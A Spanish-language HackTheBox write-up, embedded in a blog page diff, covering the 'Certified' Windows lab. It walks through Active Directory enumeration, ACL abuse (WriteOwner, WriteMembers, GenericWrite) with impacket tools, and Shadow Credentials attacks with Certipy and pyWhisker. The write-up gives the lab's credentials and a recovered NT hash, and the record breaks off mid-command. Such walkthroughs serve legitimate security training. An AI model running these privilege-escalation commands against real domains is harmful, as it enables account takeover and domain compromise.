@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Certified Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="
+
+Tags: #Machine #Windows #Medium #ADCS
+
+
+
+  Introducción
+  
+    
+    Link to heading
+  
+
+Este writeup documenta la resolución de la máquina Windows Certified en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.
+El ataque se centra en la enumeración y abuso de ACLs en Active Directory. El usuario inicial dispone de permisos WriteOwner sobre un grupo administrativo, lo que permite tomar control del objeto y escalar privilegios mediante delegaciones encadenadas hasta comprometer cuentas de servicio. Mediante la toma de propiedad del objeto y el abuso de estas delegaciones, se compromete una cuenta de servicio mediante ataques de Shadow Credentials.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Certified Machine - HackTheBox">
+  <meta name="twitter:description" content="Tags: #Machine #Windows #Medium #ADCS Introducción Link to heading Este writeup documenta la resolución de la máquina Windows Certified en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.
+El ataque se centra en la enumeración y abuso de ACLs en Active Directory. El usuario inicial dispone de permisos WriteOwner sobre un grupo administrativo, lo que permite tomar control del objeto y escalar privilegios mediante delegaciones encadenadas hasta comprometer cuentas de servicio. Mediante la toma de propiedad del objeto y el abuso de estas delegaciones, se compromete una cuenta de servicio mediante ataques de Shadow Credentials.">
+
+<meta property="og:url" content="https://celero0.github.io/posts/certified/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Certified Machine - HackTheBox">
+  <meta property="og:description" content="Tags: #Machine #Windows #Medium #ADCS Introducción Link to heading Este writeup documenta la resolución de la máquina Windows Certified en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.
+El ataque se centra en la enumeración y abuso de ACLs en Active Directory. El usuario inicial dispone de permisos WriteOwner sobre un grupo administrativo, lo que permite tomar control del objeto y escalar privilegios mediante delegaciones encadenadas hasta comprometer cuentas de servicio. Mediante la toma de propiedad del objeto y el abuso de estas delegaciones, se compromete una cuenta de servicio mediante ataques de Shadow Credentials.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-23T02:59:04+00:00">
+    <meta property="article:modified_time" content="2026-05-23T02:59:04+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/certified/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/certified/">
+              Certified Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-05-23T02:59:04Z">
+                May 23, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Windows #Medium #ADCS</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Este writeup documenta la resolución de la máquina Windows <strong>Certified</strong> en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.</p>
+<p>El ataque se centra en la enumeración y abuso de ACLs en Active Directory. El usuario inicial dispone de permisos <strong>WriteOwner</strong> sobre un grupo administrativo, lo que permite tomar control del objeto y escalar privilegios mediante delegaciones encadenadas hasta comprometer cuentas de servicio. Mediante la toma de propiedad del objeto y el abuso de estas delegaciones, se compromete una cuenta de servicio mediante ataques de <em>Shadow Credentials</em>.</p>
+<p>Finalmente, se explota una mala configuración en <strong>Active Directory Certificate Services (ADCS)</strong>. Mediante una cadena de delegaciones y el abuso de una plantilla vulnerable, se logra emitir un certificado con la identidad del usuario Administrador, obteniendo control total del dominio.</p>
+<h1 id="información-previa">
+  Información previa
+  <a class="heading-link" href="#informaci%c3%b3n-previa">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como es común en pentests reales de Windows, comenzarás la máquina <strong>Certified</strong> con credenciales para la siguiente cuenta:</p>
+<p>Usuario: <code>judith.mader</code><br>
+Contraseña: <code>judith09</code>.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>El escaneo de puertos revela servicios típicos de un entorno Windows con Active Directory, incluyendo DNS, Kerberos, LDAP y SMB.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.231.186 -oG allPorts
+</span></span></code></pre></div><img src="/images/Pasted image 20260522164731.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Escaneando los servicios y las versiones que corren en los puertos encontrados anteriormente, se obtienen los siguientes resultados</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49693,49694,49695,49724,49733 -sCV 10.129.231.186 -oN portServices
+</span></span></code></pre></div><p>En el resultado del escaneo, podemos ver el nombre de dominio <code>certified.htb</code></p>
+<img src="/images/Pasted image 20260522165538.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Procederemos a agregarlo a nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20260522165859.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-smb">
+  Enumeración SMB
+  <a class="heading-link" href="#enumeraci%c3%b3n-smb">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Primeramente probamos las credenciales proporcionadas inicialmente, para confirmar que estas sean válidas</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb certified.htb -u <span style="color:#a5d6ff">&#39;judith.mader&#39;</span> -p <span style="color:#a5d6ff">&#39;judith09&#39;</span>
+</span></span></code></pre></div><p>y tenemos como resultado que el dominio acepta las credenciales</p>
+<img src="/images/Pasted image 20260522170221.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora revisamos si nuestro usuario tiene acceso a algún recurso compartido por <code>SMB</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb certified.htb -u <span style="color:#a5d6ff">&#39;judith.mader&#39;</span> -p <span style="color:#a5d6ff">&#39;judith09&#39;</span> --shares
+</span></span></code></pre></div><p>El usuario posee acceso de lectura a los compartidos por defecto del dominio (<strong>IPC$, NETLOGON y SYSVOL</strong>), sin evidencia de datos sensibles en esta etapa.</p>
+<img src="/images/Pasted image 20260522170247.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Dentro de estos directorios no encontramos nada interesante.</p>
+<h1 id="enumeración-ldap">
+  Enumeración LDAP
+  <a class="heading-link" href="#enumeraci%c3%b3n-ldap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como tenemos credenciales válidas, haremos una enumeración de usuarios con <code>ldapsearch</code>, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.231.186 -D <span style="color:#a5d6ff">&#39;certified\judith.mader&#39;</span> -w <span style="color:#a5d6ff">&#39;judith09&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=certified,DC=htb&#34;</span> | grep <span style="color:#a5d6ff">&#34;userPrincipalName&#34;</span>
+</span></span></code></pre></div><p>La enumeración LDAP permite identificar múltiples cuentas de usuario dentro del dominio.</p>
+<img src="/images/Pasted image 20260522170427.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Se filtran los valores de <code>userPrincipalName</code> para construir una lista de usuarios del dominio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.231.186 -D <span style="color:#a5d6ff">&#39;certified\judith.mader&#39;</span> -w <span style="color:#a5d6ff">&#39;judith09&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=certified,DC=htb&#34;</span> | grep <span style="color:#a5d6ff">&#34;userPrincipalName&#34;</span> | awk <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | cut -d <span style="color:#a5d6ff">&#39;@&#39;</span> -f1 &gt;&gt; users
+</span></span></code></pre></div><p>Teniendo como resultado lo siguiente</p>
+<img src="/images/Pasted image 20260522170506.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-de-active-directory">
+  Enumeración de Active Directory
+  <a class="heading-link" href="#enumeraci%c3%b3n-de-active-directory">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Para realizar una enumeración del dominio más exhaustiva, y con el objetivo de mapear relaciones de delegación y posibles rutas de escalación de privilegios. utilizaremos la herramienta <code>bloodhound</code></p>
+<h2 id="recolectar-datos-zip">
+  Recolectar datos .zip
+  <a class="heading-link" href="#recolectar-datos-zip">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Como tenemos credenciales de un usuario válido en el dominio, utilizaremos <code>bloodhound-python</code>, para recolectar información en un zip, de la siguiente manera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#a5d6ff">&#39;judith.mader&#39;</span> -p <span style="color:#a5d6ff">&#39;judith09&#39;</span> -d certified.htb -ns 10.129.231.186 -c All --zip
+</span></span></code></pre></div><p>La recolección inicial falla debido a discrepancias de tiempo entre el atacante y el controlador de dominio.</p>
+<img src="/images/Pasted image 20260522170808.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para solucionar esto utilizaremos <code>faketime</code> y  <code>ntpdate</code> de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.231.186 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> bloodhound-python -u <span style="color:#a5d6ff">&#39;judith.mader&#39;</span> -p <span style="color:#a5d6ff">&#39;judith09&#39;</span> -d certified.htb -ns 10.129.231.186 -c All --zip
+</span></span></code></pre></div><p>Así obtenemos nuestro archivo <code>.zip</code> que deberemos cargar en <code>Bloodhound</code></p>
+<img src="/images/Pasted image 20260522171959.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="preparar-docker-con-bloodhound">
+  Preparar docker con Bloodhound
+  <a class="heading-link" href="#preparar-docker-con-bloodhound">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para crear nuestro contenedor con <code>Bloodhound</code> descargaremos el <code>docker-compose</code> desde la siguiente página web <a href="https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/"  class="external-link" target="_blank" rel="noopener">https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/</a></p>
+<p>Basta con realizar el siguiente comando para descargarlo</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
+</span></span></code></pre></div><p>Una vez descargada deberemos iniciar el contenedor con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose up -d
+</span></span></code></pre></div><p>Posteriormente accedemos desde nuestro navegador a <code>localhost:8080</code> y se nos abrirá la interaz de <code>Bloodhound</code></p>
+<img src="/images/Pasted image 20260306232542.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En el apartado de correo pondremos <code>admin</code>, y para obtener la contraseña habrá que leer los logs de nuestro contenedor con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose logs
+</span></span></code></pre></div><img src="/images/Pasted image 20260522172320.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En este apartado deberemos subir el <code>.zip</code> que obtuvimos anteriormente</p>
+<img src="/images/Pasted image 20260306232728.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y luego vamos a <code>Administration</code>, y esperamos hasta que aparezca <code>Complete</code></p>
+<img src="/images/Pasted image 20260306232824.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="análisis-de-ad-con-bloodhound">
+  Análisis de AD con BloodHound
+  <a class="heading-link" href="#an%c3%a1lisis-de-ad-con-bloodhound">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como bien sabemos, tenemos las credenciales del usuario <code>judith.mader</code> por tanto veremos las propiedades y los permisos que tiene este usuario</p>
+<p>Vemos que <code>judith.mader</code> tiene permisos <code>WriteOwner</code> sobre el grupo <code>MANAGEMENT</code>, lo que permite cambiar el propietario (owner) de un objeto, en este caso el grupo <code>MANAGEMENT</code>.</p>
+<img src="/images/Pasted image 20260522175842.png" style="width:100%; height:auto; display:block; margin:auto;">
+<hr>
+<p>Lo que haremos inicialmente será tomar propiedad del grupo <code>MANAGEMENT</code> aprovechando el permiso <code>WriteOwner</code> que posee <code>judith.mader</code>. Para ello cambiaremos el propietario del objeto y asignaremos a <code>judith.mader</code> como nueva dueña del grupo <code>MANAGEMENT</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#a5d6ff">&#39;judith.mader&#39;</span> -target <span style="color:#a5d6ff">&#39;MANAGEMENT&#39;</span> <span style="color:#a5d6ff">&#39;certified.htb&#39;</span>/<span style="color:#a5d6ff">&#39;judith.mader&#39;</span>:<span style="color:#a5d6ff">&#39;judith09&#39;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260522185138.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para modificar los miembros del grupo <code>MANAGEMENT</code>, debemos modificar la DACL del grupo, y otorgarle <code>WriteMembers</code> a <code>judith.mader</code>.</p>
+<p>Para ello primero necesitamos obtener el Distinguished Name (DN) del grupo, para ello utilizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.231.186 -D <span style="color:#a5d6ff">&#39;judith.mader@certified.htb&#39;</span> -w <span style="color:#a5d6ff">&#39;judith09&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=certified,DC=htb&#34;</span> <span style="color:#a5d6ff">&#34;(cn=MANAGEMENT)&#34;</span>
+</span></span></code></pre></div><p>Obteniendo lo siguiente <code>dn: CN=Management,CN=Users,DC=certified,DC=htb</code></p>
+<img src="/images/Pasted image 20260522185920.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Procedemos a  modificar la DACL del grupo, y otorgarle <code>WriteMembers</code> a <code>judith.mader</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#a5d6ff">&#39;write&#39;</span> -rights <span style="color:#a5d6ff">&#39;WriteMembers&#39;</span> -principal <span style="color:#a5d6ff">&#39;judith.mader&#39;</span> -target-dn <span style="color:#a5d6ff">&#39;CN=Management,CN=Users,DC=certified,DC=htb&#39;</span> <span style="color:#a5d6ff">&#39;certified.htb&#39;</span>/<span style="color:#a5d6ff">&#39;judith.mader&#39;</span>:<span style="color:#a5d6ff">&#39;judith09&#39;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260522190043.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora podemos agregar al usuario <code>judith.mader</code> al grupo <code>MANAGEMENT</code>, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group addmem <span style="color:#a5d6ff">&#34;MANAGEMENT&#34;</span> <span style="color:#a5d6ff">&#34;judith.mader&#34;</span> -U <span style="color:#a5d6ff">&#34;CERTIFIED&#34;</span>/<span style="color:#a5d6ff">&#34;judith.mader&#34;</span>%<span style="color:#a5d6ff">&#34;judith09&#34;</span> -S 10.129.231.186
+</span></span></code></pre></div><p>y una vez realizado el comando, podemos verificarlo con este</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group members <span style="color:#a5d6ff">&#34;MANAGEMENT&#34;</span> -U <span style="color:#a5d6ff">&#34;certified.htb&#34;</span>/<span style="color:#a5d6ff">&#34;judith.mader&#34;</span>%<span style="color:#a5d6ff">&#34;judith09&#34;</span> -S 10.129.231.186
+</span></span></code></pre></div><p>Viendo que nuestro usuario se ha agregado al grupo correctamente</p>
+<img src="/images/Pasted image 20260522190547.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si vemos el <code>Outbound Object control</code> del grupo <code>MANAGEMENT</code>, vemos que este grupo tiene permisos <code>GenericWrite</code> sobre el usuario <code>MANAGEMENT_SVC</code></p>
+<img src="/images/Pasted image 20260522190748.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora debemos explotar <code>Shadow Credentials</code>, Podemos utilizar <code>Certipy</code> o <code>PyWhisker</code>.</p>
+<p>A continuación se explicará como realizarlo con ambas herramientas.</p>
+<h2 id="shadow-credentials-con-certipy">
+  Shadow Credentials con Certipy
+  <a class="heading-link" href="#shadow-credentials-con-certipy">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>NOTA:</strong> Debido a un reinicio del entorno, la IP inicial cambió a <code>10.129.1.220</code>.</p>
+<p>Para obtener el <code>HASH NT</code> de <code>MANAGEMENT_SVC</code> con <code>Certipy</code> podemos utilizar el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.220 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> certipy-ad shadow auto -u <span style="color:#a5d6ff">&#39;judith.mader@certified.htb&#39;</span> -p <span style="color:#a5d6ff">&#39;judith09&#39;</span> -account <span style="color:#a5d6ff">&#39;management_svc&#39;</span> -dc-ip 10.129.1.220 -dc-host certified.htb
+</span></span></code></pre></div><img src="/images/Pasted image 20260522195330.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Obteniendo el siguiente HASH NT</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>a091c1832bcdd4677c28b5a6a1295584
+</span></span></code></pre></div><hr>
+<h2 id="shadow-credentials-con-pywhisker">
+  Shadow Credentials con PyWhisker
+  <a class="heading-link" href="#shadow-credentials-con-pywhisker">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Análogamente, podemos utilizar <code>PyWhisker</code> para realizar el <code>Shadow Credentials</code> de forma más manual, y poder obtener el HASH NT del usuario <code>MANAGEMENT_SVC</code></p>
+<h3 id="instalando-pywhisker">
+  Instalando PyWhisker
+  <a class="heading-link" href="#instalando-pywhisker">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Para instalar <code>pyWhisker</code> primeramente nos clonamos el repositorio completo</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/ShutdownRepo/pywhisker.git
+</span></span><span style="display:flex;"><span>cd pywhisker
+</span></span></code></pre></div><p>Posteriormente activamos el entorno virtual de <code>Python</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m venv .venv
+</span></span><span style="display:flex;"><span>source .venv/bin/activate
+</span></span></code></pre></div><p>Actualizamos pip</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install --upgrade pip
+</span></span></code></pre></div><p>Instalamos todas las dependencias</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install -r requirements.txt
+</span></span></code></pre></div><p>y finalmente instalamos <code>PyWhisker</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install .
+</span></span></code></pre></div><h3 id="obtener-hash-nt-con-pywhisker">
+  Obtener HASH NT con PyWhisker
+  <a class="heading-link" href="#obtener-hash-nt-con-pywhisker">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Una vez dentro del grupo <code>MANAGEMENT</code>, abusamos de la ACL <code>GenericWrite</code> para obtener control sobre la cuenta <code>management_svc</code> agregando Shadow Credentials. Para ello utilizamos <code>pyWhisker</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 pywhisker.py -d <span style="color:#a5d6ff">&#34;certified.htb&#34;</span> -u <span style="color:#a5d6ff">&#34;judith.mader&#34;</span> -p <span style="color:#a5d6ff">&#34;judith09&#34;</span> --target <span style="color:#a5d6ff">&#34;management_svc&#34;</span> --action <span style="color:#a5d6ff">&#34;add&#34;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260522200228.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Esto nos proporcionará un certificado PFX, el cual utilizaremos para autenticarnos como el usuario <code>management_svc</code>.<br>
+Usando este certificado, obtenemos un TGT para dicho usuario mediante <code>PKINITtools</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.220 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> python3 ../../PKINITtools/gettgtpkinit.py -cert-pfx 4Gz16c4z.pfx certified.htb/management_svc -pfx-pass <span style="color:#a5d6ff">&#39;ijOEvJpAhhjXvY1kKIJc&#39;</span> management_svc.ccache
+</span></span></code></pre></div><img src="/images/Pasted image 20260522201150.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Se genera un TGT de Kerberos asociado al usuario comprometido, el cual se exporta para su uso posterior. A partir de este ticket, se utiliza <code>getnthash.py</code> del mismo toolkit para obtener el hash NTLM del usuario <code>management_svc</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export <span style="color:#79c0ff">KRB5CCNAME</span><span style="color:#ff7b72;font-weight:bold">=</span>management_svc.ccache
